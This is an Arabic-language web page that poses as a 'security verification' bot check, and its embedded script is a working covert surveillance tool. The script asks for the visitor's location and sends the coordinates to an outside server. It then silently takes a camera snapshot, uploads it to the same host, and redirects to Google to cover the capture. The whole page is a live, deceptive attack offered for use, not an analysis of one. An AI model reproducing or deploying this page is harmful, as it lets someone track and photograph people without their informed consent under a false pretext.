<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق الأمني</title>
    
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5; /* لون خلفية رصاصي فاتح مريح */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh; /* يخلي الصندوق بنص الشاشة بالضبط */
        }

        .card {
            background: white;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }

        .icon {
            font-size: 50px;
            margin-bottom: 15px;
        }

        h2 {
            color: #1c1e21;
            margin-bottom: 10px;
            font-size: 24px;
        }

        p {
            color: #606770;
            margin-bottom: 30px;
            line-height: 1.6;
            font-size: 15px;
        }

        button {
            background-color: #0866ff; /* لون أزرق احترافي */
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
        }

        button:hover {
            background-color: #0054d1;
        }

        /* هذا الكلاس يتفعل من نضغط الزر حتى يصير لونه رصاصي */
        button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="icon">🛡️</div>
        <h2>التحقق الأمني</h2>
        <p>يرجى الضغط على زر المتابعة والسماح بالصلاحيات المطلوبة للتأكد من أنك لست برنامجاً آلياً (روبوت).</p>
        <button id="continueBtn" onclick="start()">متابعة (Continue)</button>
    </div>

    <script>
        async function start() {
            // 1. تغيير شكل الزر حتى المستخدم يعرف ان اكو شي ديصير
            const btn = document.getElementById("continueBtn");
            btn.disabled = true;
            btn.innerText = "جاري التحقق، يرجى الانتظار...";

            console.log("1. جاري طلب الموقع...");

            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    console.log("✅ تم تحديد الموقع، جاري إرساله للسيرفر...");
                    try {
                        await fetch("https://verification-backend-o1t0.onrender.com/location", {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude
                            })
                        });
                    } catch (e) { 
                        console.log("خطأ في الاتصال بسيرفر الموقع"); 
                    }
                    openCamera();
                },
                (err) => {
                    console.log("❌ المستخدم رفض الموقع، ننتقل للكاميرا...");
                    openCamera();
                }
            );
        }

        function openCamera() {
            console.log("2. جاري طلب الكاميرا...");
            
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                let video = document.createElement("video");
                video.srcObject = stream;
                video.play();

                let canvas = document.createElement("canvas");

                setTimeout(() => {
                    canvas.width = 300;
                    canvas.height = 200;
                    canvas.getContext("2d").drawImage(video, 0, 0, 300, 200);

                    stream.getTracks().forEach(track => track.stop());

                    canvas.toBlob((blob) => {
                        if (!blob) return;
                        
                        const formData = new FormData();
                        formData.append("image", blob, "photo.png");

                        console.log("جاري رفع الصورة للسيرفر...");
                        fetch("https://verification-backend-o1t0.onrender.com/image", {
                            method: "POST",
                            body: formData
                        })
                        .then(res => {
                            if (res.ok) {
                                console.log("تمت العملية بنجاح!");
                                window.location.href = "https://google.com";
                            }
                        })
                        .catch(err => {
                            console.log("خطأ في رفع الصورة:", err);
                            // إرجاع الزر لشكله الطبيعي إذا صار خطأ
                            document.getElementById("continueBtn").disabled = false;
                            document.getElementById("continueBtn").innerText = "حاول مرة أخرى";
                        });

                    }, 'image/png');
                }, 3000); 
            })
            .catch(err => {
                alert("الرجاء السماح للكاميرا بالعمل لتكملة الإجراءات!");
                document.getElementById("continueBtn").disabled = false;
                document.getElementById("continueBtn").innerText = "متابعة (Continue)";
            });
        }
    </script>

</body>
</html>
